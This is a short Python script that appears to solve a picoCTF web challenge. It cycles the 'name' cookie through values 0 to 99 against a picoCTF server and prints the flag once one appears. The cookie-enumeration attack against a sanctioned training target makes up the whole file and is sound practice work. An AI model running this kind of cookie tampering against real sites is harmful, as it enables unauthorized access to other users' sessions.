import urllib.request
import re

URL = 'http://mercury.picoctf.net:64944/check'
PATTERN = re.compile(r'picoCTF\{[^\}]*\}')


def main():
  for i in range(100):
    header = {'Cookie': 'name={}'.format(i)}
    request = urllib.request.Request(URL, headers=header)
    response = urllib.request.urlopen(request)
    match = PATTERN.search(response.read().decode())
    if match:
      print(match.group())
      break


if __name__ == "__main__":
  main()
